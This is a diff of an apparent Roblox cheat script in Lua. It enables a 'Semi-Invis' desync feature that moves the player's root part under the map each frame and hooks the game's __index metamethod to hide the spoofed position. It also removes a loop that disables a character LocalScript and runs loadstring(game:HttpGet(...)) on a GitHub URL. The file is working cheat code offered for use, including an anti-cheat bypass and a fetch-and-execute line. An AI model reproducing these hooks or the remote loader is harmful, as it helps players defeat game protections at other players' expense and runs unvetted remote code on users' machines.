@@ -1932,7 +1932,6 @@ end)
             end
         end)
 
-
         --// Hook_CFrame
         local XDDDDDD = nil
         XDDDDDD = hookmetamethod(game, "__index", newcclosure(function(self, key)
@@ -1950,61 +1949,56 @@ end)
             return XDDDDDD(self, key)
         end))
 
---[[AntiAimTab:AddToggle('LayVis', {
-    Text = 'Layvis (WIP)',
+AntiAimTab:AddToggle('LayVis', {
+    Text = 'Semi-Invis',
     Default = false, 
-    Tooltip = 'Lay Under the Road', 
+    Tooltip = 'Lays Under the Road', 
 })
 
 Toggles.LayVis:OnChanged(function()
-    if Toggles.LayVis.Value then
-        local lplr = game.Players.LocalPlayer
-        local desync_stuff = {}
-        local cframetpdesync = nil
-        local cframetpdesynctype = "Layvis"
-        local visualizemodellol = nil
-        local r6_dummy = game:GetObjects("rbxassetid://9474737816")[1]
-            r6_dummy.Head.Face:Destroy()
-                for i, v in pairs(r6_dummy:GetChildren()) do
-                    v.Transparency = v.Name == "HumanoidRootPart" and 1 or 0.70
-                    v.Material = "Neon"
-                    v.Color = Color3.fromRGB(255, 139, 139)
-                    v.CanCollide = false
-                    v.Anchored = false
-                end
+    ruby.Blatant.AntiAim.LayVis = Toggles.LayVis.Value
+end)
 
-local goofy = game:GetService("RunService").heartbeat:Connect(
-                function()
-                    if cframetpdesync == true then
-                        desync_stuff[1] = lplr.Character.HumanoidRootPart.CFrame
-                        local fakeCFrame = lplr.Character.HumanoidRootPart.CFrame
-                    if cframetpdesynctype == "Layvis" then
-                            fakeCFrame = fakeCFrame * CFrame.new(0, -5, 0)
-                            fakeCFrame = fakeCFrame * CFrame.Angles(1.55, 0, 0)
-                            
-                            if visualizemodellol == true then
-                                r6_dummy.Parent = workspace
-                                r6_dummy.HumanoidRootPart.Velocity = Vector3.new()
-                                r6_dummy:SetPrimaryPartCFrame(fakeCFrame)
-                            else
-                                r6_dummy.Parent = nil
-                            end
-                            lplr.Character.HumanoidRootPart.CFrame = fakeCFrame
-                        game:GetService("RunService").RenderStepped:Wait()
-                        lplr.Character.HumanoidRootPart.CFrame = desync_stuff[1]
-                        else
-                            if r6_dummy.Parent ~= nil then
-                                r6_dummy.Parent = nil
-                            end
-                        end
+local desync_stuff = {}
+local desync = false
+local cframetpdesynctype = "Layvis"
+local visualizemodellol = true
+local r6_dummy = game:GetObjects("rbxassetid://9474737816")[1]
+    r6_dummy.Head.Face:Destroy()
+        for i, v in pairs(r6_dummy:GetChildren()) do
+            v.Transparency = v.Name == "HumanoidRootPart" and 1 or 0.70
+            v.Material = "Neon"
+            v.Color = Color3.fromRGB(255, 139, 139)
+            v.CanCollide = false
+            v.Anchored = false
+        end
+        
+        game:GetService("RunService").heartbeat:Connect(
+        function()
+            if desync == true then
+                desync_stuff[1] = lplr.Character.HumanoidRootPart.CFrame
+                local fakeCFrame = lplr.Character.HumanoidRootPart.CFrame
+            if cframetpdesynctype == "Layvis" then
+                    fakeCFrame = fakeCFrame * CFrame.new(0, -5, 0)
+                    fakeCFrame = fakeCFrame * CFrame.Angles(1.55, 0, 0)
+                    if visualizemodellol == true then
+                        r6_dummy.Parent = workspace
+                        r6_dummy.HumanoidRootPart.Velocity = Vector3.new()
+                        r6_dummy:SetPrimaryPartCFrame(fakeCFrame)
+                    else
+                        r6_dummy.Parent = nil
                     end
-                end)
-                
-    if cframetpdesync == false then
-        goofy:Disconnect()
-    end
-
-    local oldIndex
+                    lplr.Character.HumanoidRootPart.CFrame = fakeCFrame
+                game:GetService("RunService").RenderStepped:Wait()
+                lplr.Character.HumanoidRootPart.CFrame = desync_stuff[1]
+                else
+                    if r6_dummy.Parent ~= nil then
+                        r6_dummy.Parent = nil
+                    end
+                end
+            end
+        end)    
+                local oldIndex
     oldIndex =
         hookmetamethod(
         game,
@@ -2014,7 +2008,7 @@ local goofy = game:GetService("RunService").heartbeat:Connect(
                 if not velocitywalk == true or enablehitpartdesync == true then
                     if not checkcaller() then
                         if
-                            key == "CFrame" and cframetpdesync and lplr.Character and
+                            key == "CFrame" and desync and lplr.Character and
                                 lplr.Character:FindFirstChild("HumanoidRootPart") and
                                 lplr.Character:FindFirstChild("Humanoid") and
                                 lplr.Character:FindFirstChild("Humanoid").Health > 0
@@ -2033,18 +2027,17 @@ local goofy = game:GetService("RunService").heartbeat:Connect(
                 return oldIndex(self, key)
             end
         )
-    )
-end)                        
+    )                        
 
 Toggles.LayVis:AddKeyPicker('LayBind', {
     Default = 'None', 
-    SyncToggleState = false, 
+    SyncToggleState = true, 
 
     Mode = 'Toggle',
 
-    Text = 'Lay', 
+    Text = 'Invis', 
     NoUI = false,
-})--]]
+})
 
 AntiAimTab:AddToggle('VFallTggle', {
     Text = 'Velocity Fall',
@@ -5072,6 +5065,14 @@ RunService.Heartbeat:Connect(function ()
     else 
         LocalPlayer.Character.Humanoid.UseJumpPower = true
     end
+    if Toggles.LayVis.Value then
+        wait()
+        desync = true
+        ruby.Visuals.Local.Chams = true
+    else
+        desync = false
+        ruby.Visuals.Local.Chams = false
+    end
     if ruby.Blatant.Exploits.NoSlow then
         wait()
         local bodyeffectsBounderies = LocalPlayer.Character.BodyEffects.Movement:FindFirstChild('NoJumping') or LocalPlayer.Character.BodyEffects.Movement:FindFirstChild('ReduceWalk') or LocalPlayer.Character.BodyEffects.Movement:FindFirstChild('NoWalkSpeed')
@@ -5202,9 +5203,9 @@ Toggles.WatermarkEnabled:OnChanged(function()
 end)
 
 OtherGroupbox:AddToggle('KeybindFrameEnabled', {
-    Text = 'Keybind Frame',
+    Text = 'Keybind List',
     Default = true,
-    Tooltip = 'Keybind Frame Enabled',
+    Tooltip = 'Keybind List Enabled',
 })
 
 Toggles.KeybindFrameEnabled:OnChanged(function()
@@ -5309,22 +5310,6 @@ local function commands(msg,lplr)
 		end
 	end
 end--]]
-
-coroutine.resume(coroutine.create(function()
-    while wait(3) do
-        local function main()
-            if player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript') then
-                player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript').Disabled = true
-            end
-            if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
-                player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
-            end
-            loadstring(game:HttpGet('https://raw.githubusercontent.com/derrtyb/scripts/main/mods'))()
-        end
-        local success, err = pcall(main)
-    end
-end))
-
 
 Library:SetWatermark(title_string)
 
